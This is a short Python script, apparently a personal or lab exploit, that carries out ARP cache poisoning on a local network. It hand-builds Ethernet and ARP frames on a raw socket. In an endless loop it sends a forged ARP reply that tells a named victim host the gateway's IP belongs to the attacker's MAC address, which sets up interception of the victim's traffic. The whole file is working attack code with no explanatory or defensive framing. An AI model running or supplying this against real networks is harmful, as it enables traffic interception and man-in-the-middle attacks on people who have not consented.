import socket
import struct
import binascii
import time


#cc:2f:71:02:6a:3e

#04:b0:e7:58:2f:42

# attacker ip. in this case us, is not important

rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
rawSocket.bind(("wlp2s0", socket.htons(0x0806)))

# eth header
gatewaymac = binascii.unhexlify('04b0e7582f42')
victimmac = binascii.unhexlify('0800279d1833')
sourcemac = binascii.unhexlify('cc2f71026a3e')
spoofmac = binascii.unhexlify('032775491873')
eth_type = binascii.unhexlify('0806')

eth_header = victimmac+sourcemac+eth_type
gweth_header = gatewaymac+sourcemac+eth_type
# arp header

hwtype = binascii.unhexlify('0001')
prototype = binascii.unhexlify('0800')
hwsize = binascii.unhexlify('06')
protosize = binascii.unhexlify('04')
whohas = binascii.unhexlify('0001')
isat = binascii.unhexlify('0002')
gatewayip = socket.inet_aton('192.168.100.1') #gateway
victimip = socket.inet_aton('192.168.100.101')

arp_request = gweth_header+hwtype+prototype+hwsize+protosize+whohas+spoofmac+victimip+gatewaymac+gatewayip

arp_reply = eth_header+hwtype+prototype+hwsize+protosize+isat+sourcemac+gatewayip+victimmac+victimip

# gateway_reply = gweth_header+hwtype+prototype+hwsize+protosize+opcode+sourcemac+dest_proto+gatewaymac+source_proto


while True:
	print('send spoof AF_PACKET')
	rawSocket.send(arp_reply)
	# rawSocket.send(arp_request)
	time.sleep(1)